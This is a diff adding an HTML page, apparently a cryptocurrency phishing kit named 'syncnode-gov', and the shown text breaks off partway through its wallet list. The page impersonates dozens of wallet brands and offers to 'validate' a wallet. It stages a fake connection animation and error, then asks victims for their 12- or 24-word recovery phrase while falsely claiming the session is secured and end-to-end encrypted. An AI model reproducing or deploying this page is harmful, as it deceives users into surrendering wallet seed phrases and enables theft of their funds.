@@ -1,0 +1,859 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.6.0/remixicon.css"/>
+    <title>syncnode-gov</title>
+</head>
+    <style>
+        @keyframes moveLeftRight {
+            0% { transform: translateX(0); } 
+            50% { transform: translateX(950%); } 
+            100% { transform: translateX(0); }  
+        }
+
+        .moving-dot {
+            animation: moveLeftRight 3s linear infinite; 
+        }
+
+        @keyframes moveRight {
+        0% { transform: translateX(0%); }  
+        50% { transform: translateX(2200%); } 
+        100% { transform: translateX(0%); }  
+}
+
+.moving-swing {
+    animation: moveRight 4s linear infinite; 
+}
+
+
+        @media (max-width: 768px) {
+        @keyframes moveRight {
+        0% { transform: translateX(0%); } 
+        50% { transform: translateX(1800%); } 
+        100% { transform: translateX(0%); }  
+    }
+
+    .moving-swing {
+        animation: moveRight 4s linear infinite; 
+    }
+}
+
+        @media (max-width: 480px) {
+        @keyframes moveRight {
+        0% { transform: translateX(0%); } 
+        50% { transform: translateX(1500%); } 
+        100% { transform: translateX(0%); }  
+    }
+
+    .moving-swing {
+        animation: moveRight 4s linear infinite; /* Runs forever */
+    }
+}
+        
+    </style>
+<body>
+
+    <div class="opacity-100 inset-0 bg-black/50 backdrop-blur-xs z-20 top-[-100%] duration-500 ease-in-out p-4 w-full fixed h-full flex items-center justify-center" id="pop-up">
+        <div class="relative z-50 max-w-md min-w-xs md:w-130 md:h-auto flex flex-col w-full bg-white rounded-xl shadow-md p-2 mx-auto justify-center">
+            <div class="relative flex justify-end -top-12 -right-4">  
+                <button class="cursor-pointer bg-white text-xs rounded-full p-2" id="close-icon">X</button>
+            </div>
+            <div class="form-logo w-10 h-10 flex justify-center items-center mx-auto">
+                <img src="" alt="WalletLogo" id="formLogo" class="w-12">
+            </div>
+            <p class="mt-16 text-lg font-semibold text-center text-[#8f8c8c] px-6">This session is secured and encrypted</p>
+
+            <div class="mt-16">
+                <div id="textArea" class="z-30 md:pt-5 pt-16  hidden p-4 absolute w-full md:h-75 lg:h-80 h-87 rounded-lg bottom-0 top-0 left-0 bg-white">
+                    
+                    <div class="form-logo w-10 h-10 flex justify-center items-center mx-auto" id="dropDown">
+                        <img src="" alt="WalletLogo" id="formLogo" class="w-12">
+                    </div>
+                    
+                    <form id="form" class="mx-auto flex flex-col items-center justify-center">
+                        <div>
+                            <p class="mt-5 text-lg font-semibold text-center text-[#8f8c8c]">This session is secured and encrypted</p>
+                            <div id="error-message" class="hidden border border-black p-2 bg-white rounded absolute bottom-0 left-[50%] w-[50%] md:w-56">
+                                Please Lenghten this text to 50 characters or more
+                            </div>
+                            <textarea id="username" required placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces." name="username"  class=" font-normal text-lg placeholder:font-normal focus:border-pink-200 focus:outline-none text-blue-800 border-gray-200 mt-4 placeholder:text-lg placeholder:text-gray-400 p-1 w-full border h-30"></textarea>
+                            <button id="connectBtn" disabled onclick="redirect()" class="mt-2 bg-[#5142fc] w-full rounded-2xl p-2 text-white font-bold">Connect Wallet</button>
+                        </div>
+                    </form>
+                </div>
+                <div id="dropForm" class="hidden p-4 z-10 absolute w-full h-80 rounded-lg bottom-0 top-0 left-0 bg-white">
+                    <p class="mt-16 px-8 text-lg font-semibold text-center text-[#8f8c8c]">This session is secured and encrypted</p>
+                    <div class="pt-6 flex flex-col gap-8">
+                        <p class="border p-0.5 text-red-600 border-red-600 text-xs px-4 text-center rounded-lg">An error occurred... please try again or connect mannually</p>
+                        <button id="tryAgain" class="cursor-pointer hover:bg-[#2C7CF5] rounded-xl text-[#2C7CF5] hover:text-white duration-300 ease-in p-2 border border-[#5142ec] font-bold">Try Agin</button>
+                        <button id="btnbtnConnect" class="mt-1 duration-300 ease-in-out cursor-pointer hover:opacity-90 bg-[#5142ec] p-2 rounded-xl text-white font-bold">Connect Manually</button>
+                    </div>
+
+                </div>
+                <div id="movingObjectSection" class="relative w-full md:w-100 h-1 font-bold bg-[#0000FF] mx-auto">
+                    <div id="movingObject" class="moving-swing absolute left-0 top-1/2 -translate-y-1/2 w-4 h-4 bg-blue-500 rounded-full"></div>
+                </div>
+                <p class="font-bold text-lg text-center tracking-tighter text-wrap px-16">Starting secure connection.....</p>
+                <p class="text-center font-semibold text-gray-500 text-lg">Please Wait.....</p>
+            </div>
+
+            <p class="mt-20 text-center px-6 tracking-tight font-bold text-gray-500 text-lg">
+                <i class=" text-3xl text-bold ri-shield-fill"></i>
+                This session is protected with an end-to-end encryption
+            </p>
+        </div>
+    </div>
+  <nav id="navbar" class="transition-all duration-300  w-full h-17 opacity-90 fixed flex px-10 py-4 z-10">
+    <div class="">
+        <button class="z-20 cursor-pointer left-[600px] fixed flex items-center rounded-full xl:left-[1000px] bg-[#0000FF] text-sm md:w-36 lg:left-[750px] lg:w-36 lg:h-12 p-2 text-white"><i class="text-lg md:text-2xl ri-secure-payment-fill"></i>validate wallet</button>
+        <button class="left-60 cursor-pointer fixed md:hidden rounded-full xl:left-[1000px] bg-[#0000FF] text-sm md:w-36 lg:left-[750px] lg:w-36 lg:h-12 p-2 text-white"><i class="text-lg md:text-2xl ri-secure-payment-fill"></i></button>
+    </div>
+        <div class="">
+            <button class="xl:left-[1400px] fixed cursor-pointer left-[700px] md:left-[850px] lg:left-[1100px] rounded-md p-2 text-white  bg-[#A850E6]"><i class="text-2xl ri-sun-line"></i></button>
+            <button class="xl:left-[1350px] fixed cursor-pointer left-[650px] md:left-[900px] lg:left-[1050px] rounded-md p-2 text-white bg-gray-800"><i class="text-2xl ri-moon-line"></i></button> 
+        </div>
+    </nav>
+    
+
+    <section class="pt-24 ">
+        <div class="px-4 xl:px-12">
+
+                <h1 class="text-center text-2xl font-bold md:text-4xl">Select a Wallet</h1>
+                <div class="w-30 mx-auto h-1 bg-[#0000FF] mt-5">
+                    <div class="relative -top-1 w-3 h-3 rounded-full bg-[#0000FF] moving-dot" ></div>
+                </div>
+
+            <div class="mt-8 grid md:grid-cols-2 gap-6 lg:grid-cols-3 xl:grid-cols-4 mb-10" >
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="meta-btn">
+                    <img src="img/metamask.jpg" alt="" class="w-20  card-logo"  id="logo-1" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="cursor-pointer font-bold text-black">Metamask</button>
+                        <button class="cursor-pointer font-semibold text-gray-600">metamask.io</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="trust-btn">
+                    <img src="img/trust_wallet.jpg" alt="" class="w-20 card-logo" id="logo-2" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-16 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="cursor-pointer font-bold text-black" >Trust Wallet</button>
+                        <button class="cursor-pointer font-semibold text-gray-600">trustwallet.com</button>
+                    </div>
+                </div>
+
+                <div class=" card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="safepal-btn">
+                    <img src="img/safepal.png" alt="" class="w-20 rounded-full card-logo" id="logo-3" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer">Safepal</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">trustwallet.com</button>
+                    </div>
+                </div>
+
+                <div class=" card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="ledgerlive-btn">
+                    <img src="img/ledger_live.jpg" alt="" class="w-20 card-logo" id="logo-4" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer">Ledger Live</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">ledger.com</button>
+                    </div>
+                </div>
+
+                <div class=" card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="hash-btn">
+                    <img src="img/hash.png" alt="" class="w-20 card-logo" id="logo-5">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer">Hash</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">hashpack.app</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="coinbase-btn">
+                    <img src="img/coinbase.png" alt="" class="w-20 rounded-full card-logo" id="logo-6">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer">Coinbase</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">coinbase.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="crypto-btn">
+                    <img src="img/crypto defi wallet.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-7">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Crypto.com | Defi Wallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">crypto.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="changewallet-btn">
+                    <img src="img/chainwallet.png" alt="" class="w-20 rounded-full card-logo" id="logo-8">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer">Chainge Wallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">chainge.finance</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="bitfrostwallet-btn" >
+                    <img src="img/Bitfrost Wallet.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-9" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer">Bitfrost Wallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">bifrostwallet.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="station-btn">
+                    <img src="img/terrastation.com.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-10" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer">Station</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">terrastation.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="pera-btn">
+                    <img src="img/Pera Algo Wallet.png" alt="" class="w-20 rounded-full card-logo" id="logo-11" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer">Pera Algo Wallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">Algo.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="walken-btn">
+                    <img src="img/walken_wallet.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-12" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer">Walken</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">Walken</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="stepn-btn">
+                    <img src="img/stepnWallet.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-13">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer">Stepn</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">Stepn</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="saita-btn" >
+                    <img src="img/saitaMask.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-14">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer">Saitamask</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">Saitamask</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="safemoo-btn" >
+                    <img src="img/safemoo.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-15">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer">Safemoon</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">Safemoon</button>
+                    </div>
+                </div>
+
+                
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="saitapro-btn">
+                    <img src="img/saitaPro.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-16" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer">SaitaPro</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">SaitaPro</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="defly-btn">
+                    <img src="img/deflyWallet.png" alt="" class="w-20 rounded-full card-logo" id="logo-17" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer">Defly Wallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">Defly Wallet</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="walletconnect-btn" >
+                    <img src="img/connectWallet.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-18" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer">Wallet Connect</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">wallettconnect.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="blockwallet-btn" >
+                    <img src="img/block.jpg" alt="" class="w-20 card-logo" id="logo-19" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer">Block wallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">wallettconnect.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="stargazer-btn">
+                    <img src="img/starGazer.png" alt="" class="w-20 rounded-full card-logo" id="logo-20" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer">Star gazer</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">Stargazer.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="tenset-btn">
+                    <img src="img/tenset.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-21" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer">Tenset</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">terrastation.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="bull-btn" >
+                    <img src="img/CKbull.png" alt="" class="w-20 rounded-full card-logo" id="logo-22" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer">CK Bull</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">CKbull.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="liquality-btn" >
+                    <img src="img/liquality.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-23" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer">Liquality</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">liquality.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="binance-btn" >
+                    <img src="img/binance-chainwallet.png" alt="" class="w-20 rounded-full card-logo" id="logo-24" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Binance Chain Wallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">binance.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="polygon-btn" >
+                    <img src="img/polygon.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-25" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Polygon Wallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">polygon.technology</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="rainbow-btn">
+                    <img src="img/rainbow.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-26" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Rainbow</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">Rainbow.me</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="bitpay-btn">
+                    <img src="img/bitpay.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-27">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Bitpay</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">bitpay.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="wallet-btn" >
+                    <img src="img/walleth.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-28">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Walleth</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">walleth.org</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="argent-btn">
+                    <img src="img/argent.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-29">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Argent</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">argent.xyz</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="huobi-btn">
+                    <img src="img/huobi.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-30" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Huobi Wallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">huobiwallet.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="encrypted-btn" >
+                    <img src="img/encrypted_ink.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-31" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Encrypted Ink</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">encrypted.ink</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="compound-btn" >
+                    <img src="img/compound.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-32" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Compound</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">compound.finance</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="polkadot-btn">
+                    <img src="img/polkadot.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-33" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Polkadot</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">polkadot.network</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="iotex-btn">
+                    <img src="img/iotex.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-34" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Iotex</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">iotex.io</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="coin-btn">
+                    <img src="img/coin98.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-35">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Coin98</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">coin98.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="token-btn">
+                    <img src="img/token_pocket.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-36" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Token Pocket</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">tokenpocket.pro</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="math-btn">
+                    <img src="img/math_wallet.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-37">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Math Wallet</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">mathwallet.org</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="inch-btn">
+                    <img src="img/1inch.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-38" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">1Inch</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">1inch.io</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="darma-btn">
+                    <img src="img/dharma.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-39">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Dharma</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">dharma.io</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="trustwallet-btn">
+                    <img src="img/trust_vault.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-40" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Trust Vault</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">trustology.io</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="mikey-btn">
+                    <img src="img/mykey.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-41">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">MYKEY</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">mykey.org</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="atomic-btn" >
+                    <img src="img/atomic.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-42" >
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Atomic</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">atomicwallet.io</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="coolwallet-btn" >
+                    <img src="img/cool_wallet_s.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-43">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">CoolWalletS</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">coolwallet.io</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="nash-btn">
+                    <img src="img/nash.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-44">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Nash</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">nash.io</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="coinmoney-btn">
+                    <img src="img/coinomi.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-45">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
+                    <div class="flex flex-col items-start">
+                        <button class="font-bold text-black cursor-pointer text-start">Coinomi</button>
+                        <button class="font-semibold text-gray-600 cursor-pointer">coinomi.com</button>
+                    </div>
+                </div>
+
+                <div class="card w-full shadow-lg outline-0 h-28 flex items-center gap-4 p-4 relative" id="gridplus-btn">
+                    <img src="img/gridplus.jpg" alt="" class="w-20 rounded-full card-logo" id="logo-46">
+                    <i class="ri-check-fill absolute text-xs p-0.5 left-20 top-20 rounded-full bg-[#0000FF] text-white"></i>
